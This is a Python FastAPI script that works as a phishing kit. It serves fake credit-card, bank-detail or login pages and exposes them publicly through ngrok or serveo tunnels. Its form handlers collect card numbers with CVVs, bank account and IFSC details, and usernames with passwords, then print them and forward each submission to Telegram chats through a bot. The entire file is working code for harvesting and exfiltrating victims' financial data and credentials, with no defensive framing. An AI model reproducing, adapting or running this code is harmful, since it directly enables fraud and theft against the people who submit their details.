import time
from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse, RedirectResponse
import telebot
import subprocess
import os
import threading
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from .env file

app = FastAPI()

# Set up your Telegram bot with telebot
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')  # Load from environment
CHAT_IDS = os.getenv('CHAT_IDS').split(',')  # Load from environment and split into a list
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# ANSI escape codes for colors (for terminal output)
GREEN = '\033[92m'  # Green for questions
RED = '\033[91m'    # Red for answers
RESET = '\033[0m'   # Reset to default color

# Ask the user which page to load at startup, with 'credit' as the default
page_choice = input("Which page would you like to load? (Type 'bankinfo' for Bank Info Form, or 'credit' or 'login' for Login Form): ").strip().lower() or 'credit'

# Function to start the tunneling service
def start_tunneling(tunnel_choice):
    time.sleep(5)  # Delay before starting tunneling
    if tunnel_choice == 'ngrok':
        if not os.path.exists('/usr/local/bin/ngrok'):
            print("Ngrok is not installed. Please install ngrok before running this script.")
            exit(1)
        print("Starting ngrok...")
        subprocess.Popen(['ngrok', 'http', '8000'])  # Start ngrok
    elif tunnel_choice == 'serveo':
        print("Starting serveo...")
        subprocess.Popen(['ssh', '-R', '80:localhost:8000', 'serveo.net'])  # Start serveo
    else:
        print("Invalid choice. Please restart the app and choose a valid option.")
        exit(1)

# Ask if the user wants to use tunneling, defaulting to 'yes'
use_tunneling = input("Do you want to use tunneling? (yes/no, default is 'yes' with serveo): ").strip().lower() or 'yes'

if use_tunneling == 'yes':
    # Set default tunnel choice to serveo if no input is provided
    tunnel_choice = input("Which tunneling service would you like to use? (Type 'ngrok' or 'serveo', default is 'serveo'): ").strip().lower() or 'serveo'
    # Start tunneling in a separate thread
    threading.Thread(target=start_tunneling, args=(tunnel_choice,), daemon=True).start()
else:
    print("Tunneling will be skipped.")

@app.get("/", response_class=HTMLResponse)
async def index():
    # Render the chosen page based on the user's input
    if page_choice == 'credit':
        return open("cc.html").read()  # You should serve this file correctly
    elif page_choice == 'bankinfo':
        return open("bank_form.html").read()
    elif page_choice == 'login':
        return open("login_form.html").read()
    else:
        return "Invalid choice. Please restart the app and choose a valid option."

def send_to_telegram(message):
    """Send message to multiple Telegram chat IDs."""
    for chat_id in CHAT_IDS:
        bot.send_message(chat_id, message, parse_mode="HTML")
        
        
@app.post("/submit-credit-card-info")
async def submit_credit_card_info(
    card_holder: str = Form(...),
    card_number: str = Form(...),
    expiry_date: str = Form(...),
    cvv: str = Form(...)
):
    # Print raw submitted data to the terminal
    raw_data = {
        "card_holder": card_holder,
        "card_number": card_number,
        "expiry_date": expiry_date,
        "cvv": cvv
    }
    print("Raw Credit Card Information Submitted:")
    print(raw_data)  # Print the raw data as a dictionary

    # Display form data in the terminal with colors
    print("Credit Card Information Submitted:")
    print(f"{GREEN}Card Holder Name:{RESET} {RED}{card_holder}{RESET}")
    print(f"{GREEN}Card Number:{RESET} {RED}{card_number}{RESET}")
    print(f"{GREEN}Expiry Date:{RESET} {RED}{expiry_date}{RESET}")
    print(f"{GREEN}CVV:{RESET} {RED}{cvv}{RESET}")

    # Prepare message for Telegram
    telegram_message = (
        f"<b>Credit Card Information Submitted:</b>\n"
        f"Card Holder Name: {card_holder}\n"
        f"Card Number: {card_number}\n"
        f"Expiry Date: {expiry_date}\n"
        f"CVV: {cvv}"
    )
    
    # Send data to Telegram
    send_to_telegram(telegram_message)
    
    return "Credit card information submitted successfully!"


@app.post("/submit-bank-info")
async def submit_bank_info(
    account_holder: str = Form(...),
    account_number: str = Form(...),
    bank_name: str = Form(...),
    branch_name: str = Form(...),
    ifsc_code: str = Form(...)
):
    # Print raw submitted data to the terminal
    raw_data = {
        "account_holder": account_holder,
        "account_number": account_number,
        "bank_name": bank_name,
        "branch_name": branch_name,
        "ifsc_code": ifsc_code
    }
    print("Raw Bank Information Submitted:")
    print(raw_data)  # Print the raw data as a dictionary

    # Display form data in the terminal with colors
    print("Bank Information Submitted:")
    print(f"{GREEN}Account Holder Name:{RESET} {RED}{account_holder}{RESET}")
    print(f"{GREEN}Account Number:{RESET} {RED}{account_number}{RESET}")
    print(f"{GREEN}Bank Name:{RESET} {RED}{bank_name}{RESET}")
    print(f"{GREEN}Branch Name:{RESET} {RED}{branch_name}{RESET}")
    print(f"{GREEN}IFSC Code:{RESET} {RED}{ifsc_code}{RESET}")

    # Prepare message for Telegram
    telegram_message = (
        f"<b>Bank Information Submitted:</b>\n"
        f"Account Holder Name: {account_holder}\n"
        f"Account Number: {account_number}\n"
        f"Bank Name: {bank_name}\n"
        f"Branch Name: {branch_name}\n"
        f"IFSC Code: {ifsc_code}"
    )
    
    # Send data to Telegram
    send_to_telegram(telegram_message)
    
    return "Bank information submitted successfully!"
    
    


@app.post("/login")
async def login(
    username: str = Form(...),
    password: str = Form(...)
):
    # Print raw login data to the terminal
    raw_data = {
        "username": username,
        "password": password
    }
    print("Raw Login Data Submitted:")
    print(raw_data)  # Print the raw data as a dictionary

    # Print received data to the terminal
    print("Received login data:")
    print(f"{GREEN}Username:{RESET} {RED}{username}{RESET}")
    print(f"{GREEN}Password:{RESET} {RED}{password}{RESET}")
    
    # Prepare message for Telegram
    telegram_message = (
        f"<b>Login Data Received:</b>\n"
        f"Username: {username}\n"
        f"Password: {password}"
    )
    
    # Send data to Telegram
    send_to_telegram(telegram_message)
    
    # Redirect back to the home page
    return RedirectResponse(url="/")

if __name__ == '__main__':
    # Start the FastAPI app with uvicorn
    print("Starting FastAPI application...")
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)

